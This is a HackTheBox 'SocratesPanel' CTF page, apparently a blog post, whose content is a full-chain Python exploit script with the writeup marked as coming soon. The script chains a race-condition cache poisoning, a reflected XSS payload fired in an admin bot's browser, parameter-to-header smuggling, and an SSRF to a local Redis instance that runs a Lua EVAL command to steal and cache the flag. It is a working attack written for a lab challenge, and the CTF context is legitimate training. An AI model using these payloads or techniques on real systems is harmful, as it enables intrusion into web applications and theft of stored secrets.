---
layout: ctf
title: "HackTheBox: SocratesPanel"
platform: "HackTheBox"
type: "Challenge"
difficulty: "Hard"
image: "/assets/img/ctf/web_challenge.png"
tags: [Web, Code-Review, Race-Condition, HTML-Injection, Reflective-XSS, Redis, SSRF, Cache-Poisoning, CDN, Parameter-Overshadowing, Cross-Protocol-Smuggling, Parameter-To-Header-Injection]
date: 2026-07-13
---

// Full-Chain Exploit. Writeup coming soon.

Full-Chain Exploit:

```python
import time
import random
import string
import hashlib
import requests
import threading
from urllib.parse import quote

# Taken from the application; simply by debugging it.
words = ['does', 'inspiration,', 'but.', 'the', 'up', 'table,', 'hard', 'to', 'them', 'increasing,', 'authority;', 'stable', 'also', 'friends', 'point', 'sensible', 'disgrace', 'one,', 'As', 'chatter', 'on', 'should', 'I', 'earth', 'By', 'bad', 'is', 'training...', 'contradict', 'well.', 'beyond,', 'servants', 'himself.', 'them.', 'prophets', 'There', 'with', 'ulcer', 'strength', 'him.', 'power', 'kind', 'Children', 'before', 'thou', 'intelligent', 'at', 'man,', 'attainable', 'ignorance.', 'He', 'making', 'top', 'for', 'words', 'children.', 'eat.', 'Remember,', 'contempt', 'all', 'really', 'it.', 'human', 'thinks', 'virtue', 'find', 'me,', 'about', 'others', 'thought', 'smartest', 'pure', 'Be', 'while', 'avoid', 'atmosphere', 'young', 'improvement', 'constant.', 'properties,', 'teaching,', 'disrespect', 'ordinary', 'households.', 'writings,', 'live', 'there', 'doing', 'no', 'or', 'who', 'had', 'shortest', 'everyone', 'food,', 'wisest', 'beauty', 'man.', 'affairs', 'possibly', 'good', 'think', 'be', 'My', "you'll", 'might', 'way', 'mean.', 'Science', 'deliver', 'our', 'thing', 'understand', 'itself.', 'enter', 'The', 'enabled', 'tyrannize', 'will', 'cross', 'world.', 'art', 'get', 'soul;', 'persons', 'proud', 'yourself', 'Snowmen', 'shall', 'be;', 'grow', 'means', 'things', 'soul', 'freedom', 'buffs', 'firm', 'Thiu', 'Regard', 'now', 'every', 'reality', 'Think', 'devour', 'from', 'gobble', 'tool', 'an', 'condition', 'rise', 'only', 'live.', 'No', 'true', 'soul.', 'that', 'us', 'exercise.', 'eat', 'good,', 'ignorant', 'poetry,', 'name', 'thing,', 'faults.', 'capable.', 'laid', 'I,', 'into', 'persuading', 'neither', 'done', 'Remember', 'youth,', 'children', 'evil', 'anybody', 'not', 'private.', 'given', 'praise', 'can', 'his', 'such', 'thy', 'it,', 'prolonging,', 'divine.', 'appear', 'arduous', 'improving', 'alike,', 'If', 'speech', 'person.', 'without', 'all.', 'honor', 'task', '.', 'tyrants.', 'jewel', 'others.', 'decided', 'shouldst', 'are', 'argument,', 'hearts', 'money,', 'True', 'old', 'well', 'company,', 'in', 'instinct', 'knowing', 'in,', 'nor', 'debate', 'becomes', 'best', 'make', 'undue', 'other', 'blessings.', '-', 'greatest', 'honour', 'was', 'profess', 'not,', 'reprove', 'superior.', 'says', 'do', 'elation', 'nearest', 'myself,', 'demand', 'actions,', 'permanent.', 'Then', 'richest', 'their', 'We', 'belief', 'credit', 'whence', "'We", 'They', 'angers', 'be.', 'drink', 'money', 'love.', 'rekindle', 'which', 'go', 'observe,', 'resist', 'God', 'too', 'once', 'why.', 'have.', 'gain', 'Virtue', 'therefore', 'know.', 'Wind', 'evil,', 'mountain,', 'when', 'live;', 'know', 'those', 'strengthen', 'teach', 'endeavor', 'known', 'promontory,', 'time', 'portion,', 'bladders;', 'tyrants,', 'again.', 'least,', 'nothing.', 'fall', 'Employ', 'When', 'loser.', 'place', 'seeks', 'upon', 'so', 'think.', 'nothing', 'worthwhile,', 'am', 'seem,', 'least', 'misfortunes', 'alive,', 'misfortune.', 'matter', "'I", 'heap', 'of', 'And', 'made', 'tell', 'tokens', 'Thou', 'Bad', 'room.', 'fortune', 'teachers.', 'rich', 'any', 'me', 'moon', 'world,', 'during', 'begins', 'avoid.', 'depression', 'friendship', 'makes', 'wants,', 'care', 'praised', 'Only', 'him', 'change.', 'see', 'Greek,', 'contemplate', 'wealth,', 'you', 'poets', 'fewest', 'one.', 'surest', 'pretend', 'overjoyed', 'lifetime.', 'public', 'citizen', 'Death', 'until', 'sublime', 'wants', 'but', 'chiefly', 'scornful', 'employs', 'come', 'amateur', 'habit', 'Culture', 'except', 'may', 'has,', 'virtue.', 'easily', 'compliments,', 'adversity.', 'inward', 'This', 'cannot', 'mischievous', 'manners,', 'ever', 'continue', 'than', 'lives.', 'because', 'like', 'end', 'Give', 'life', 'God,', 'convinced', "die,'", 'were', 'and', "men's", 'would', 'unbecoming', 'content', 'set', 'amplifying', 'exists', 'Wisdom', 'outward', 'judge', 'slander', 'acceptable,', 'fact', 'People', 'doctrine', 'legs,', "live,'", 'knows', 'good.', 'Having', 'comes', 'following', 'river', 'common', 'appear.', 'people', 'they', 'dead', 'we', 'increase', 'your', 'man', 'of.', 'It', 'sea,', 'seeing', 'Get', 'virtues', 'Let', 'knowledge,', 'wiser', 'fully', 'being', 'world', 'rate,', 'practice', 'possessed', 'woman', 'longer', 'fire;', 'take', 'love', 'drink,', 'show', 'dainties', 'this', 'wisdom', 'faithful', 'unlimited', 'wonder.', 'right', 'Once', 'own', 'physical', 'See', 'reputation', 'desire', 'anything,', 'unexamined', 'wife,', 'anything', 'tolerable', 'gods.', 'marry.', 'pleased', 'capacity', 'kindly', 'speak', 'wealth', 'corrupts', 'prosperity,', 'knowledge', 'die', 'fools.', 'nature.', 'find,', 'above', 'move', 'nothing,', 'my', 'luxury;', 'most', 'intelligent,', 'body', 'today', 'harm;', 'kindled', 'Man', 'must', 'Athenian', 'elders', 'worth', 'preserve', 'having', 'become', 'a', 'what', 'extinguish', 'seers', 'philosopher...', 'for.', 'if', 'all,', 'Do', 'one', 'how', 'whereas', 'empty', 'little', 'as', 'first', 'bare', 'then', 'Envy', 'living', 'wish', 'opinion,', 'extremely', 'depart.', 'it', 'happy.', 'facilitating', 'seems,', 'full', 'have', 'valued.', 'slow', 'equal', 'giving', 'themselves', 'has', 'life,', 'contented', 'he', 'Not', 'over,', 'write', 'parents,', 'rid', 'by', 'labored', 'men', 'messages']

def post(addr: str, body: dict, headers: dict = None):
    return requests.post("http://" + addr, data=body, headers=headers, allow_redirects=False)

def get(addr: str, body: dict, headers: dict = None):
    if body:
        return requests.get("http://" + addr, data=body, headers=headers, allow_redirects=False)
    return requests.get("http://" + addr, headers=headers, allow_redirects=False)

def register(addr: str, username: str, password: str) -> str:
    """
    Registers user and returns cookie. Fail = exit.
    """

    response = post(addr + "/register", body={"username": username, "password": password})
    if not response.ok:
        print("[-] Could not register user: ", response.status_code, response.text)
        exit(0)

    def login(addr: str, username: str, password: str) -> str:
        response = post(addr + "/login", body={"username": username, "password": password, "submit": ""})
        if not response.ok:
            print("[-] Could not retrieve jwt token. Something went wrong: ", response.status_code, response.text)
            exit(0)

        return response.headers.get("Set-Cookie")

    return login(addr, username, password)

def send_report(addr: str, cookie: str):
    """
    Requests report. Fail = exit.
    """

    response = post(addr + "/api/report", body=None, headers={"Cookie": cookie})
    if not response.ok:
        print("[-] Something went wrong sending report request: ", response.status_code, response.text)
        exit(0)

def get_previous_searches(addr: str, cookie: str) -> list:
    """
    Requests admin's previous searches. Fail = exit.
    :return requests
    """

    # Make sure we CACHE-MISS by adding random strings as parameters.
    response = get(addr + "/api/prev_searches?" + ''.join(random.choices(string.ascii_letters, k=8)), body=None, headers={"Cookie": cookie})
    if not response.ok:
        print("[-] Failed to retrieve previous searches: ", response.status_code, response.text)
        exit(0)

    return response.json()["searches"]

def generate_payload(query_search: str):
    """
    Generates a multi-stage XSS and SSRF payload that executes inside the admin bot's browser context.
    
    The payload performs the following steps:
    1. Breaks out of the unescaped HTML input context using a closing sequence ("><script>").
    2. Dynamically builds a raw Redis inline command string ('eval <lua_script> 0 dummy') where the 
       entire Lua script is obfuscated into raw byte points via Lua's 'string.char(...)'. This completely 
       bypasses the RESP inline parser's restrictions on literal string quotes and internal spaces, 
       preventing protocol syntax errors when parsed by Redis.
    3. Exploits a parameter-smuggling behavior in the internal `/panel` endpoint. By passing the 
       constructed Redis command string as a POST argument key with an empty value, the Tornado backend 
       loops through the arguments and injects this entire string verbatim as a custom HTTP header name.
    4. Fires an SSRF request via Tornado's HTTP client directly at the loopback Redis instance (port 6379). 
       Since the smuggled string is written directly into the raw TCP network stream as a header name, 
       Redis processes the line as an inline RESP command.
    5. The executed Lua script calls 'get FLAG' inside the internal database, wraps the recovered flag 
       string into a structured JSON dictionary (including a fake status_code=200 and body), and writes 
       it back into Redis using 'set' at the exact cache key hash assigned to the current search URL.
    6. This directly poisons the front-end CDN layer with a counterfeit cache entry containing the flag, 
       allowing a low-privileged external user to easily exfiltrate the flag by querying the matching 
       search page from the proxy.
    """

    url = "/search?query=" + quote(query_search)
    url_hash = hashlib.sha256(url.encode()).hexdigest()

    def transform(input_str: str):
        return "string.char(" + ",".join(str(ord(character)) for character in input_str) + ")"


    lua_script = "`return(redis.call(%s,%s,cjson.encode({body=redis.call(%s,%s),status_code=200})))`" % (transform("set"), transform(url_hash), transform("get"), transform("FLAG"))

    payload = """
    "><script>
        (async () => {
            await fetch('/search?query=XSS_LEBT_' + Date.now());
            const luaScript = %s;
            const separator = String.fromCharCode(32);
            const smuggledPayload = 'eval' + separator + luaScript + separator + '0' + separator + 'dummy';
            const payloadArgs = new URLSearchParams();
            payloadArgs.append('url', 'http://127.0.0.1:6379/');
            payloadArgs.append(smuggledPayload, '');
            for (let i = 0; i < 3; i++) {
                await fetch('/panel', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: payloadArgs
                });
            }
        })();
    </script>
    """ % (lua_script,)

    print(f"[+] Generated payload for {url} / {url_hash}")
    return ''.join([i.strip().replace(' ', '/**/') for i in payload.split('\n')])

    #return """"><script>fetch('/search?query=XSS_LEBT_'+Date.now()).then(()=>{s=String.fromCharCode(32);luaScript=`return(redis.call(string.char(115,101,116),%s,cjson.encode({body=redis.call(string.char(103,101,116),string.char(70,76,65,71)),status_code=200})))`;smuggled='eval'+s+luaScript+s+'0'+s+'dummy';p=new/**/URLSearchParams();p.append('url','http://127.0.0.1:6379/');p.append(smuggled,'');[1,2,3].forEach(()=>fetch('/panel',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:p}));})</script>""" % (transform(url_hash),)

def race_admin_query(addr: str, cookie: str) -> str:
    while True:
        searches = get_previous_searches(addr, cookie)
        if len(searches) == 1:
            break

    return searches[0]

def _query(addr: str, query_search: str, query_overshadow: str, cookie: str):
    return get(addr + "/search?query=" + quote(query_search), {"query": query_overshadow}, {"Cookie": cookie})

def perform_cache_poisoning(addr: str, cookie: str, query_search: str) -> bool:
    """
    Performs cache poisoning by racing the "slow" backend database execution for the active search query.
    Instead of predicting a future query, this exploits the processing latency of the seeded 
    database. While Tornado is busy scanning rows for the bot's initial request, the Go CDN proxy 
    cache key remains empty because the backend has not yet returned a response to trigger SetNX.

    By flooding concurrent parameter-overshadowed requests (matching URL parameter but with the XSS 
    payload in the HTTP body), we force the CDN to populate the cache key with our malicious version. 
    When the backend finally finishes processing the bot's original request, the CDN's SetNX fails 
    because our poisoned entry already occupies the slot. Upon refreshing, the bot hits the poisoned 
    cache and triggers the XSS.

    :return: True if the payload successfully verified in the recent search logs, False otherwise.
    """

    print("[+] Generating payload and sending cache poisoning request!")
    payload = generate_payload(query_search)

    threads = []

    print(query_search)
    for _ in range(100):
        t = threading.Thread(target=get, args=(addr + "/search?query=" + quote(query_search), {"query": payload}, {"Cookie": cookie}))
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

    # Just to be sure cache has been poisonend.
    return payload in get_previous_searches(addr, cookie)

def main(addr: str):
    """
    1. Register user & retrieve cookie.
    2. Send report review request.
    3. Get admin's query search asap.
    4. Perform cache poisoning racing admin's request to land in cache.
    5. Wait for 5 seconds for the XSS payload to fire then query previous searches.
    6. Search & filter flag.
    """

    cookie = register(addr, "tralsesec", "tralsesec")
    print("[+] Registered user successfully.")

    send_report(addr, cookie)

    print("[+] Sent report request. Next step might take some time, go grab a coffee..")

    while True:
        query_search = race_admin_query(addr, cookie)
        print("[i] Query search: ", query_search)
        if perform_cache_poisoning(addr, cookie, query_search):
            break

    time.sleep(5)
    print("[+] Race condition worked. Fetching flag.")
    print(get_previous_searches(addr, cookie))
    response = _query(addr, query_search, query_search, cookie)
    if "HTB{" not in response.text:
        print("[-] Could not find flag in response. Race window is extremely tight. Run again.")
        exit(-1)

    print("[+] Flag: HTB{", response.text.split('HTB{')[1].split('}')[0], "}")

if __name__ == '__main__':
    main("127.0.0.1:1337")
```
